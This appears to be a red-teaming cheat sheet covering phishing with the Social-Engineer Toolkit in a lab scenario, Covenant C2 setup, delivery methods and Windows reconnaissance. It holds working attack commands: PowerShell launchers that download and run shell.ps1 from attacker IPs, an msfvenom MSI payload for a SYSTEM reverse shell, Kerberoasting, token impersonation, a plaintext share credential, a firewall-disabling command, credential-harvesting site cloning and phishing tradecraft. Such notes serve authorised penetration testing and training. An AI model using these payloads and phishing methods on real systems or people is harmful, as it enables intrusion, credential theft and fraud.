# Red Teaming / C2

## Phishing
[Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit). It is an open-source tool primarily designed by David Kennedy for social engineering attacks. It offers a wide range of features. In particular, it lets you compose and send a phishing email. In the current scenario, we will use this tool to create and send a phishing email to the target user.

To start the tool, type `setoolkit` into the terminal, and it will present you with a menu containing multiple options. At the bottom, you will see `set>`, where you can input your desired option number. For our case, we would select option `1`, i.e., `Social-Engineering Attacks`. If you choose the wrong option at any stage, the option `99` will take you back to the main menu, where you can start again. However, if you commit any mistake while writing the phishing email, you would have to press `Ctrl + C` to return to the main menu. The social engineering attacks cover various attacks from spear-phishing and mass mailer attacks to wireless access point attacks.

Example:
- **Send email to**: Let’s begin by targeting `factory@wareville.thm`
- **How to deliver the email**: We will choose `Use your own server or open relay`
- **From address**: We know that the guys at the toy factory communicate regularly with Flying Deer, the shipping company, so that we will use `updates@flyingdeer.thm` as the source email address
- **From name**: Let’s use the name `Flying Deer`
- **Username for open-relay**: We will leave it blank and just hit the **Enter** key
- **Password for open-relay**: We will leave it blank and just hit the **Enter** key
- **SMTP email server address**: We will deliver directly to the TBFC mail server by entering `10.80.166.252`.
- **Port number for the SMTP server**: We leave the default value of `25` and just hit the **Enter** key

The next set of questions will ask if you want to send it as a high priority or attach a file.

- **Flag this message as high priority:** The choice is entirely up to you, depending on your knowledge of the circumstances, but we will answer with `no`
- **Do you want to attach a file:** We will answer with `n`
- **Do you want to attach an inline file:** Again, let’s answer with `n`

Finally, we pick an email subject and enter the message contents in plaintext or HTML.

- **Email subject:** We need to think of something convincing, for example, “Shipping Schedule Changes”
- **Send the message as HTML or plain:** We will keep the default choice of plaintext and just hit the **Enter** key
- **Enter the body of the message, and type END (capitals) when finished:** Create and type any convincing message. Make sure to include the URL `http://CONNECTION_IP:8000` to check if the target will fall for this trick.

## Covenant


```sh
# INSTALLATION
The easiest way to use Covenant is by installing dotnet core. You can download dotnet core for your platform from here.
https://dotnet.microsoft.com/download/dotnet-core/3.1
Be sure to install the dotnet core version 3.1 SDK!
$ ~ > git clone --recurse-submodules https://github.com/cobbr/Covenant
$ ~ > cd Covenant/Covenant
$ ~/Covenant/Covenant > dotnet run

# REGISTER A NEW USER

# LISTENERS
Listeners (on the left menu) > Create
Choose the same BindPort and ConnectPort # (80 or 9999 for example)
ConnectAddresses has to be our attacking IP

# LAUNCHERS
Launchers menu (on the left) > Select PowerShell
Verify the default settings and click on Generate
Click on the Host tab and enter /shell.ps1 on Url field, which will be the path to the served launcher.
Then click on Host button so Launcher will show ..../shell.ps1 as part of the DownloadString command on Launcher field
Finally we execute that launcher command on the target (CMD/PS shell) # use port 9999 or just port 80 
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.8:9999/shell.ps1')
After that, we should get a notification "grunt X has been activated"


# GRUNTS
Click on the Grunt ID > Then Interact tab > Type SharpUp audit to run privesc checks
SharpUp audit # run privesc checks
shellcmd $COMMAND # run a shell command (do not use quotes)
# SYSTEM REVSHELL USING THE LAUNCHER 
msfvenom -p windows/x64/exec CMD="cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.14.14.4/shell.ps1')" -f msi > pwn.msi
shellcmd msiexec /q /i \\10.14.14.4\share\pwn.msi # change to a writable directory first
cat $FILE # read file
# Import PowerShell file
PowerShellImport // PowerView.ps1
# POWERVIEW COMMANDS
PowerShell Get-NetDomain
PowerShell Get-DomainComputer | Select name
PowerShell Find-DomainShare
net view /all \\citrix
net use \\citrix\citrix$ /u:mturner 4install!
dir \\citrix\citrix$
ls \\$HOSTNAME\$SHARE
# KERBEROASTING
PowerShell Invoke-Kerberoast
# IMPERSONATE AS A USER HAVING CREDS
MakeToken $USER DOM.COM $PASS LOGON32_LOGON_INTERACTIVE
WhoAmI
```


## Havoc

[https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b](https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b)

## Phishing

### Social Engineering Toolkit


```bash
https://github.com/trustedsec/social-engineer-toolkit

We can use the Social Engineer Toolkit to set up a fake website and phish the users. 
SEToolkit supports cloning pages and capturing incoming credentials. 
Run setoolkit and select the options Social-Engineering Attacks > Website Attack Vectors > Credential Harvester Attack > Site Cloner . Next, enter your VPN IP address (e.g. 10.10.14.X) for incoming requests, followed by the login page URL:

https://humongousretail.com/remote/auth/login.aspx

# Then we can send emails using swaks
```


### Convincing Phishing Emails

* Sender address from a significant brand, contact or cowoker. Use OSINT to suit it better to the destinatary.
* Subject: urgent, worrying, piques the victim's curiosity (account compromised, package shipped, payroll info, leaked pics...
* Content/Body: mimic standard email templates of the company, signatures, use anchor text \<a href> to disguise links

### Phishing Infrastructure

* Domain Name (buy expired domains, typosquatting, TLD alternative such as .co.uk, IDN Homograph Attack/Script Spoofing)
* SSL/TLS certificates
* Email Server/Account
* DNS Records to improve deliverability (not getting into spam folder)
* Web Server
* Analytics of emails sent, opened...

[https://getgophish.com/](https://getgophish.com/)

[https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

Droppers > software to be downloaded and run (legitimate but once installed, the intended malware is either unpacked or downloaded)

Use MS Office in Phishing as attachments with macros

Browser exploits: difficult, but might work if we know systems and are old or unpatched for sth like [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)

## DELIVERY TECHNIQUES

### Mail

The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.

The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.

Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others.

### Web

[https://attack.mitre.org/techniques/T1189/](https://attack.mitre.org/techniques/T1189/)

Web server with reputation of its domain name and TLS (Transport Layer Security) certificate.

### USB

[https://attack.mitre.org/techniques/T1091/](https://attack.mitre.org/techniques/T1091/)

Useful at conferences or events where the adversary can distribute the USB.

Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), chargingĀ USB cable, such asĀ [O.MG Cable](https://shop.hak5.org/products/omg-cable).

## Initial Access

### Network Infrastructure

Internal network with VLAN for example

A DMZ Network is an edge network that protects and adds an extra security layer to a corporation's internal local-area network from untrusted traffic. A common design for DMZ is a subnetwork that sits between the public internet and internal networks.

### AD

![](../assets/image (136).png)

```
systeminfo | findstr Domain
 Get-ADUser  -Filter *
 Get-ADUser -Filter * -SearchBase "CN=Users,DC=DOMAIN,DC=COM"
```

### AV

```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-Service WinDefend
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

### FW

```
Get-NetFirewallProfile | Format-Table Name, Enabled
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
Get-NetFirewallProfile | Format-Table Name, Enabled
Get-NetFirewallRule | select DisplayName, Enabled, Description
# To test inbound connection on port 80
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
Get-MpThreat # threats details that have been detected using MS Defender
```

### Security Event Logging and Monitoring


```bash
Get-EventLog -List
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
# Sysmon -> check if it is present
https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\* # find sysmon config file
# EDR detection
software for endpoints
• Cylance
• Crowdstrike
• Symantec
• SentinelOne
• Many others
https://github.com/PwnDexter/Invoke-EDRChecker
https://github.com/PwnDexter/SharpEDRChecker
```

